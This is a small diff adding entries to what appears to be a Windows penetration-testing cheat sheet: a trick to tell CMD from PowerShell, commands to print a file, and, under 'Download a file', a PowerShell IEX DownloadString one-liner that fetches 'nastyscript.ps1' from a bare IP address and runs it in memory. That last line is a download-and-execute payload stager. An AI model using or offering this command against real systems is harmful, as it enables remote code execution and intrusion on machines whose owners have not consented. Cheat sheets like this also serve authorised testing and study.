@@ -1,2 +1,11 @@
 ##Check if CMD or Powershell (by PetSerA)
 (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+
+##Show file content
+type file.txt
+more file.txt
+Get-Content file.txt
+
+
+#Download a file
+IEX (New-Object System.Net.Webclient).DownloadString("http://123.123.123.1/nastyscript.ps1")
